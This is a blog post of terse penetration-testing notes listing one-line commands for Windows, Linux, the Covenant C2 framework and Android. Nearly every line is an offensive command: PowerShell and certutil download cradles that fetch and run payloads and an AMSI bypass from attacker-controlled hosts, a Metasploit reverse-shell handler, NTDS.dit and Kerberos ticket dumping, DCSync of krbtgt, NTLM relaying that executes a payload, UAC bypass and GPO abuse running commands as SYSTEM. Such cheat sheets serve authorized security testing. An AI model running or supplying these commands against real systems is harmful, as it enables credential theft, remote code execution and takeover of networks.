---
layout: post
title: "Pentesting Notes"
tags: notes
---

### Windows

`Invoke-Inveigh -ConsoleOutput Y -HTTPPort 8080 -FileOutput Y -FileOutputDirectory .`

`certutil.exe -urlcache -split -f http://172.16.10.1/obfs.exe`

NTDS audit 

```
# Dump NTDS.dit file using NTDSUtils
powershell ntdsutil
ntdsutil: activate instance ntds
ntdsutil: ifm
ifm: create full c:\pentest
ifm: quit
ntdsutil: quit
```

`powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\path\to\put\data\' q q"`

`ntdsaudit.exe ntds.dit -s SYSTEM -p pwdump.txt -u users.csv`


Breakout

`C:\Windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe MSBuildShell.csproj `

`cmstp.exe /ni /s C:\Users\username\Desktop\cmstp.inf`

`rundll32 shell32.dll,Control_RunDLL \\192.168.0.4\sharez\cmd.dll`

`pcalua.exe -a C:\windows\system32\cmd.exe`

C#

`Rubeus.exe asktgt /user:username /rc4:ntlm-hash`

`Rubeus.exe dump /service:krbtgt`

PowerShell

`IEX(New-Object Net.WebClient).downloadString('http://192.168.0.1/amsi.ps1')`

```PowerShell
$string = 'iex ((new-object net.webclient).downloadstring("http://payloadserverip/Amsibypass.ps1")); iex ((new-object net.webclient).downloadstring("http://payloadserverip/payload.ps1"))'
```

`[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($string))`

`$SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force`

`$Cred = New-Object System.Management.Automation.PSCredential('Domain\user', $SecPassword)`

Use Egress-Asses for data expiltration detection capabilities.

`https://github.com/FortyNorthSecurity/Egress-Assess`

```bash
cd /opt/Egress-Assess/setup
$ sudo ./setup.sh
$ cd ..
$ sudo ./Egress-Assess.py --server http --server-port 8080
```

`PowerShell Invoke-EgressAssess -Client http -DataType ni -IP 10.0.0.4 -Port 8080 -NoPing`

### Linux

`snmpwalk -v 2c -c public <hostIP>`

`hping3 -c 1 --icmp-ts <ip-address>`

`sudo -u postgres psql -U postgres`

`python -m http.server 80`

`msfconsole  -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp;  set lhost 10.10.10.10; set lport 443; set ExitOn Session false; exploit  -j"`

`impacket-smbserver -smb2support files . `

Remove duplicate lines from the file
`awk '!seen[$0]++' filename`

mitm6

`mitm6 -i eth1 -d domain.name`

`ntlmrelayx -6 -smb2support -t smb://<target-ip> -e shell.exe`

`ntlmrelayx.py -6 -wh randomhostname.domain.local -t smb://<target-ip-to-redirect-auth-to> -l /tmp -socks -debug` 

`proxychains python3 /opt/impacket/examples/smbclient.py domain/Administrator@192.168.0.77`


Linux command to use powershell compatible encoded strings

`echo "iex(command)" | iconv --to-code UTF-16LE | base64 -w 0`

Pivoting 

`proxychains socat TCP4-LISTEN:3389,fork TCP4:10.10.10.15:3389`

Search for a *.doc or *.pdf file

`find / -type f \( -iname "*.doc" -o -iname "*.pdf" \) 2>/dev/null`

Look for file with suid set  

`find / -perm u=s -type f 2>/dev/null`

Mountable shares

`showmount -e <IP>`

`mount -t nfs 192.168.0.25:/home /tmp/mnt/`


`curl -g [ipv6-addess-here]`


vlan tagging

`sudo modprobe 8021q`

`sudo vconfig add eth0 104.`

`sudo ip addr add 10.0.0.1/24 dev eth0.104`

`sudo ip link set up eth0.104`



### Covenant


`Assembly /assemblyname:"SharpHound3" /parameters:"-c All -D domain.co.uk"`

`SharpUp audit`

`BypassUACGrunt powershell`

`MakeToken user domain.local Password`

`Rubeus Triage`

`Rubeus dump`

`Rubeus asktgt /user:users /rc4:ntlm-hash`

`Rubeus ptt /ticket:`

`DCSync DOMAIN\krbtgt`

`PortScan WS1,DC1 135,445,3389,4444,5985` 

`shell msiexec /i C:\Windows\Temp\msi-installer.msi /qn`

`PowerShellRemotingCommand Computer "powershell -enc <base64>"`

`Assembly /assemblyname:"SharpGPOAbuse" /parameters:"--AddComputerTask --TaskName \"My Task\" --Author NT AUTHORITY\SYSTEM --Command \"cmd.exe\" --Arguments \"/c <powershell-payload>" --GPOName \"My GPO\""`


### Android


`./emulator -avd <emulator-name> -writable-system -selinux disabled -qemu -enable-kvm --dns-server 8.8.8.8`

`adb root && adb remount`

`adb shell`

`adb reboot`

`adb install application.apk`

`adb logcat | grep "$(adb shell ps | grep <package-name> | awk '{print $2}')"`

`adb push frida-server /data/local/tmp/frida-server`

`adb shell "/data/local/tmp/frida-server &"`

`frida --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -f com.packageappname --no-pause -U`


Objection

`pip3 install objection`

`objection --gadget "com.packagename" explore`

`android sslpinning disable`

`android hooking search classes com.application`

